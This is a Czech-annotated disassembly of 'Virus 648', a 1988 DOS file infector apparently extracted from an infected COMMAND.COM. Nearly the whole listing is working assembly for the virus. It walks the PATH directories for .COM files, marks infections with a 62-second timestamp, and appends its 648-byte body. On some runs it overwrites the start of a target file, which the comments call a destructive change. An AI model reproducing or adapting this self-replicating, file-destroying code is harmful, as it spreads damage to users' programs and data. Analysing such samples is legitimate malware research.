

;=============================================================
;                        VIRUS 648
;-------------------------------------------------------------
; Virus byl vypreparovan ze souboru COMMAND.COM.
; Nakaza:   jaro 1988.
;
; Nakaza u tohot viru je indikovana nastavenim casu modifikace souboru
; 62 sec.
;
3BD2:5DEF 51             PUSH   CX
3BD2:5DF0 BAE85F         MOV    DX,5FE8    ; Pocatek dat do DX.
3BD2:5DF3 FC             CLD               ;=================================
3BD2:5DF4 8BF2           MOV    SI,DX      ; Obnoveni puvodnich instrukci na
3BD2:5DF6 81C60A00       ADD    SI,000A    ; adrese 100...103 ulohy typu COM.
3BD2:5DFA BF0001         MOV    DI,0100    ;
3BD2:5DFD B90300         MOV    CX,0003    ;
3BD2:5E00 F3             REPZ              ;
3BD2:5E01 A4             MOVSB             ;=================================
3BD2:5E02 8BF2           MOV    SI,DX      ; Obnoveni pocatku dat.
3BD2:5E04 B430           MOV    AH,30      ; Verze DOSu
3BD2:5E06 CD21           INT    21         ;---------------------------------
3BD2:5E08 3C00           CMP    AL,00      ; Pokud pred verzi 2.00, koncime.
3BD2:5E0A 7503           JNZ    5E0F
3BD2:5E0C E9C701         JMP    5FD6       ; Skok na konec programu.
3BD2:5E0F 06             PUSH   ES
3BD2:5E10 B42F           MOV    AH,2F      ; Adresa DTA.
3BD2:5E12 CD21           INT    21         ;---------------------------------
3BD2:5E14 899C0000       MOV    [SI+0000],BX   ; Ulozeni adresy DTA.
3BD2:5E18 8C840200       MOV    [SI+0002],ES
3BD2:5E1C 07             POP    ES
3BD2:5E1D BA5F00         MOV    DX,005F    ; Offset nove DTA od pocatku
3BD2:5E20 90             NOP               ; datove oblasti.
3BD2:5E21 03D6           ADD    DX,SI
3BD2:5E23 B41A           MOV    AH,1A      ; Nastavenie novej DTA.
3BD2:5E25 CD21           INT    21
3BD2:5E27 06             PUSH   ES
3BD2:5E28 56             PUSH   SI
3BD2:5E29 8E062C00       MOV    ES,[002C]  ; Prostredi.
3BD2:5E2D BF0000         MOV    DI,0000    ;
3BD2:5E30 5E             POP    SI         ; Hledame PATH=
3BD2:5E31 56             PUSH   SI         ;
3BD2:5E32 81C61A00       ADD    SI,001A    ; Prohledavani je koncipovane tak,
3BD2:5E36 AC             LODSB             ; ze se nepredpoklada neexistence
3BD2:5E37 B90080         MOV    CX,8000    ; promenne PATH.
3BD2:5E3A F2             REPNZ             ; Hledani "P"
3BD2:5E3B AE             SCASB             ;
3BD2:5E3C B90400         MOV    CX,0004    ; Hledani "ATH=".
3BD2:5E3F AC             LODSB             ;
3BD2:5E40 AE             SCASB             ;
3BD2:5E41 75ED           JNZ    5E30       ;
3BD2:5E43 E2FA           LOOP   5E3F       ;---------------------------------
3BD2:5E45 5E             POP    SI            ; Obnoveni ukazatele na pocatek
3BD2:5E46 07             POP    ES            ; datove oblasti.
3BD2:5E47 89BC1600       MOV    [SI+0016],DI  ; Ulozeni ukazatele na prvni
3BD2:5E4B 8BFE           MOV    DI,SI         ; adresar v PATH.
3BD2:5E4D 81C71F00       ADD    DI,001F
3BD2:5E51 8BDE           MOV    BX,SI
3BD2:5E53 81C61F00       ADD    SI,001F
3BD2:5E57 8BFE           MOV    DI,SI
3BD2:5E59 EB3A           JMP    5E95          ;===============================
3BD2:5E5B 83BC160000     CMP    Word Ptr [SI+0016],+00
3BD2:5E60 7503           JNZ    5E65
3BD2:5E62 E96301         JMP    5FC8
3BD2:5E65 1E             PUSH   DS
3BD2:5E66 56             PUSH   SI
3BD2:5E67 268E1E2C00     MOV    DS,ES:[002C]
3BD2:5E6C 8BFE           MOV    DI,SI
3BD2:5E6E 268BB51600     MOV    SI,ES:[DI+0016]
3BD2:5E73 81C71F00       ADD    DI,001F
3BD2:5E77 AC             LODSB
3BD2:5E78 3C3B           CMP    AL,3B
3BD2:5E7A 740A           JZ     5E86
3BD2:5E7C 3C00           CMP    AL,00
3BD2:5E7E 7403           JZ     5E83
3BD2:5E80 AA             STOSB
3BD2:5E81 EBF4           JMP    5E77
3BD2:5E83 BE0000         MOV    SI,0000
3BD2:5E86 5B             POP    BX
3BD2:5E87 1F             POP    DS
3BD2:5E88 89B71600       MOV    [BX+0016],SI
3BD2:5E8C 807DFF5C       CMP    Byte Ptr [DI-01],5C
3BD2:5E90 7403           JZ     5E95
3BD2:5E92 B05C           MOV    AL,5C
3BD2:5E94 AA             STOSB
3BD2:5E95 89BF1800       MOV    [BX+0018],DI  ; Preneseni retezce
3BD2:5E99 8BF3           MOV    SI,BX         ; "\*.COM".
3BD2:5E9B 81C61000       ADD    SI,0010       ;
3BD2:5E9F B90600         MOV    CX,0006       ;
3BD2:5EA2 F3             REPZ
3BD2:5EA3 A4             MOVSB
3BD2:5EA4 8BF3           MOV    SI,BX
3BD2:5EA6 B44E           MOV    AH,4E       ; Hledej prvy soubor.
3BD2:5EA8 BA1F00         MOV    DX,001F     ; DS:DX - ukazatel na jmeno.
3BD2:5EAB 90             NOP                ;
3BD2:5EAC 03D6           ADD    DX,SI       ;
3BD2:5EAE B90300         MOV    CX,0003     ; CX    - atributy souboru.
3BD2:5EB1 CD21           INT    21          ;-------------------------------
3BD2:5EB3 EB04           JMP    5EB9        ;
3BD2:5EB5 B44F           MOV    AH,4F       ; Hledej nasledujici soubor.
3BD2:5EB7 CD21           INT    21          ;-------------------------------
3BD2:5EB9 7302           JNB    5EBD           ; Soubor nebyl nalezen - SKOK
3BD2:5EBB EB9E           JMP    5E5B           ;
3BD2:5EBD 8B847500       MOV    AX,[SI+0075]   ;
3BD2:5EC1 241F           AND    AL,1F          ; Je cas 62 sec ?
3BD2:5EC3 3C1F           CMP    AL,1F          ;
3BD2:5EC5 74EE           JZ     5EB5           ; Pokracuj v hledani.
3BD2:5EC7 81BC790000FA   CMP    Word Ptr [SI+0079],FA00  ; Velikost souboru.
3BD2:5ECD 77E6           JA     5EB5                     ; Prilis velky.
3BD2:5ECF 83BC79000A     CMP    Word Ptr [SI+0079],+0A
3BD2:5ED4 72DF           JB     5EB5                     ; Prilis maly.
3BD2:5ED6 8BBC1800       MOV    DI,[SI+0018]
3BD2:5EDA 56             PUSH   SI
3BD2:5EDB 81C67D00       ADD    SI,007D        ; Preneseni jmena souboru.
3BD2:5EDF AC             LODSB                 ;
3BD2:5EE0 AA             STOSB                 ;
3BD2:5EE1 3C00           CMP    AL,00          ;
3BD2:5EE3 75FA           JNZ    5EDF           ;-----------------------------
3BD2:5EE5 5E             POP    SI
3BD2:5EE6 B80043         MOV    AX,4300       ; Cti mod pristupu.
3BD2:5EE9 BA1F00         MOV    DX,001F       ; DS:DX         jmeno souboru.
3BD2:5EEC 90             NOP                  ;
3BD2:5EED 03D6           ADD    DX,SI         ;
3BD2:5EEF CD21           INT    21            ;-----------------------------
3BD2:5EF1 898C0800       MOV    [SI+0008],CX
3BD2:5EF5 B80143         MOV    AX,4301       ; Zmen mod pristupu.
3BD2:5EF8 81E1FEFF       AND    CX,FFFE       ;
3BD2:5EFC BA1F00         MOV    DX,001F       ;
3BD2:5EFF 90             NOP                  ;
3BD2:5F00 03D6           ADD    DX,SI         ;
3BD2:5F02 CD21           INT    21            ;-----------------------------
3BD2:5F04 B8023D         MOV    AX,3D02       ; Otevri soubor.
3BD2:5F07 BA1F00         MOV    DX,001F       ;
3BD2:5F0A 90             NOP                  ;
3BD2:5F0B 03D6           ADD    DX,SI         ;
3BD2:5F0D CD21           INT    21            ;-----------------------------
3BD2:5F0F 7303           JNB    5F14
3BD2:5F11 E9A500         JMP    5FB9          ;
3BD2:5F14 8BD8           MOV    BX,AX         ;
3BD2:5F16 B80057         MOV    AX,5700       ; Cti cas a datum zmeny.
3BD2:5F19 CD21           INT    21            ;-----------------------------
3BD2:5F1B 898C0400       MOV    [SI+0004],CX  ; Cti systemovy cas.
3BD2:5F1F 89940600       MOV    [SI+0006],DX  ;
3BD2:5F23 B42C           MOV    AH,2C         ;
3BD2:5F25 CD21           INT    21            ;-----------------------------
3BD2:5F27 80E607         AND    DH,07         ; Sekundy
3BD2:5F2A 7510           JNZ    5F3C
3BD2:5F2C B440           MOV    AH,40         ; Zapis do souboru.
3BD2:5F2E B90500         MOV    CX,0005       ;
3BD2:5F31 8BD6           MOV    DX,SI         ; Destruktivni zmena.
3BD2:5F33 81C28A00       ADD    DX,008A       ;
3BD2:5F37 CD21           INT    21            ;-----------------------------
3BD2:5F39 EB65           JMP    5FA0
3BD2:5F3B 90             NOP
3BD2:5F3C B43F           MOV    AH,3F         ; Cteni ze souboru.
3BD2:5F3E B90300         MOV    CX,0003       ;
3BD2:5F41 BA0A00         MOV    DX,000A       ;
3BD2:5F44 90             NOP                  ;
3BD2:5F45 03D6           ADD    DX,SI         ;
3BD2:5F47 CD21           INT    21            ;-----------------------------
3BD2:5F49 7255           JB     5FA0
3BD2:5F4B 3D0300         CMP    AX,0003
3BD2:5F4E 7550           JNZ    5FA0
3BD2:5F50 B80242         MOV    AX,4202       ; SEEK
3BD2:5F53 B90000         MOV    CX,0000       ;
3BD2:5F56 BA0000         MOV    DX,0000       ;
3BD2:5F59 CD21           INT    21            ;----------------------------
3BD2:5F5B 7243           JB     5FA0
3BD2:5F5D 8BC8           MOV    CX,AX
3BD2:5F5F 2D0300         SUB    AX,0003
3BD2:5F62 89840E00       MOV    [SI+000E],AX
3BD2:5F66 81C1F902       ADD    CX,02F9
3BD2:5F6A 8BFE           MOV    DI,SI
3BD2:5F6C 81EFF701       SUB    DI,01F7
3BD2:5F70 890D           MOV    [DI],CX
3BD2:5F72 B440           MOV    AH,40         ; Zapis do souboru.
3BD2:5F74 B98802         MOV    CX,0288       ;
3BD2:5F77 8BD6           MOV    DX,SI         ;
3BD2:5F79 81EAF901       SUB    DX,01F9       ;
3BD2:5F7D CD21           INT    21            ;----------------------------
3BD2:5F7F 721F           JB     5FA0
3BD2:5F81 3D8802         CMP    AX,0288
3BD2:5F84 751A           JNZ    5FA0
3BD2:5F86 B80042         MOV    AX,4200       ; SEEK
3BD2:5F89 B90000         MOV    CX,0000       ;
3BD2:5F8C BA0000         MOV    DX,0000       ;
3BD2:5F8F CD21           INT    21            ;----------------------------
3BD2:5F91 720D           JB     5FA0
3BD2:5F93 B440           MOV    AH,40
3BD2:5F95 B90300         MOV    CX,0003       ; Zapis do souboru.
3BD2:5F98 8BD6           MOV    DX,SI         ;
3BD2:5F9A 81C20D00       ADD    DX,000D       ;
3BD2:5F9E CD21           INT    21            ;----------------------------
3BD2:5FA0 8B940600       MOV    DX,[SI+0006]
3BD2:5FA4 8B8C0400       MOV    CX,[SI+0004]
3BD2:5FA8 81E1E0FF       AND    CX,FFE0
3BD2:5FAC 81C91F00       OR     CX,001F
3BD2:5FB0 B80157         MOV    AX,5701       ; Nastav cas modifikace.
3BD2:5FB3 CD21           INT    21            ;----------------------------
3BD2:5FB5 B43E           MOV    AH,3E         ; Uzavri soubor.
3BD2:5FB7 CD21           INT    21            ;----------------------------
3BD2:5FB9 B80143         MOV    AX,4301       ; Zmen mod pristupu.
3BD2:5FBC 8B8C0800       MOV    CX,[SI+0008]  ;
3BD2:5FC0 BA1F00         MOV    DX,001F       ;
3BD2:5FC3 90             NOP                  ;
3BD2:5FC4 03D6           ADD    DX,SI         ;
3BD2:5FC6 CD21           INT    21            ;----------------------------
3BD2:5FC8 1E             PUSH   DS
3BD2:5FC9 B41A           MOV    AH,1A         ; Nastav DTA.
3BD2:5FCB 8B940000       MOV    DX,[SI+0000]  ;
3BD2:5FCF 8E9C0200       MOV    DS,[SI+0002]  ;
3BD2:5FD3 CD21           INT    21            ;----------------------------
3BD2:5FD5 1F             POP    DS
3BD2:5FD6 59             POP    CX
3BD2:5FD7 33C0           XOR    AX,AX
3BD2:5FD9 33DB           XOR    BX,BX         ; a skok na puvodni obsluhu.
3BD2:5FDB 33D2           XOR    DX,DX
3BD2:5FDD 33F6           XOR    SI,SI
3BD2:5FDF BF0001         MOV    DI,0100
3BD2:5FE2 57             PUSH   DI
3BD2:5FE3 33FF           XOR    DI,DI
3BD2:5FE5 C2FFFF         RET    FFFF
;
;
old_jmp   DB  3 DUP (?)
3BD2:5FE0                         -80 00 8A 33 00 60 9E 0B          ...3.`..
3BD2:5FF0  03 00 E9 DD 0B E9 EC 5C-2A 2E 43 4F 4D 00 20 00  ..i].il\*.COM. .
3BD2:6000  76 9D 50 41 54 48 3D 43-3A 5C 43 4F 4D 4D 41 4E  v.PATH=C:\COMMAN

